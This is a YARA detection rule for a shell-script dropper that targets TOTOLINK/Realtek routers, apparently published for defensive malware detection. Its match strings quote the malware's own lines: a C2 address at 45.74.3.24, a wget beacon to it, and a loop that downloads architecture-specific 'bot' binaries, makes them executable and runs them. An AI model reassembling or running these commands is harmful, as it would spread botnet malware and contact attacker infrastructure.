rule SCRIPT_Dropper_Unknown_ForgeAuto_87740a04
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "87740a04af37f2d637caf98a73ab30c18273f1a8b3a48e4c0f935a4b365445c8"
        yarahub_uuid = "efc33337-46b2-4a69-a2de-c8d66c8a06a1"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "bc9bfb67c6fc79736a08313fed09ac02"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "[ -d \"$d\" ] || continue" ascii
        $s1 = "robust TOTOLINK/Realtek stager." ascii
        $s2 = "fails. Mirrors ms-reinfect.sh but path-fallbacks and exec-verified." ascii
        $s3 = "C=http://45.74.3.24" ascii
        $s4 = "cb(){ wget -q -O /dev/null \"$C/oob/$1\" >/dev/null 2>&1; }" ascii
        $s5 = "armv8l|aarch64) A=aarch64 ;;" ascii
        $s6 = "\"$A\" = arm7 ] && { grep -qi vfp /proc/cpuinfo || A=arm7sf; }" ascii
        $s7 = "candidate dirs, most-likely-writable first" ascii
        $s8 = "DIRS=\"/tmp /var/tmp /var /mnt /root /etc /dev/shm /data\"" ascii
        $s9 = "if ! ( : > \"$d/.wtest\" ) 2>/dev/null; then" ascii
        $s10 = "cb \"tr-nowrite-$(echo $d | tr -dc a-zA-Z0-9)\"" ascii
        $s11 = "rm -f \"$d/.wtest\" 2>/dev/null" ascii
        $s12 = "for a in $A arm7 arm7sf arm6 mips mpsl aarch64; do" ascii
        $s13 = "cb \"tr-try-$(echo $d|tr -dc a-zA-Z0-9)-$a\"" ascii
        $s14 = "rm -f \"$P\" 2>/dev/null" ascii
        $s15 = "if ! wget -q -O \"$P\" \"$C/bot.$a\" 2>/dev/null; then cb \"tr-dlfail-$a\"; continue; fi" ascii
        $s16 = "sz=$(wc -c < \"$P\" 2>/dev/null)" ascii
        $s17 = "[ \"$sz\" -gt 1000 ] 2>/dev/null || { cb \"tr-short-$a\"; continue; }" ascii
        $s18 = "chmod 755 \"$P\" 2>/dev/null || { cb \"tr-chmodfail-$a\"; continue; }" ascii
        $s19 = "\"$P\" >/dev/null 2>&1 &" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s1, $s2, $s4, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s14, $s15, $s16, $s17, $s18, $s19) and 1 of ($s3)
}
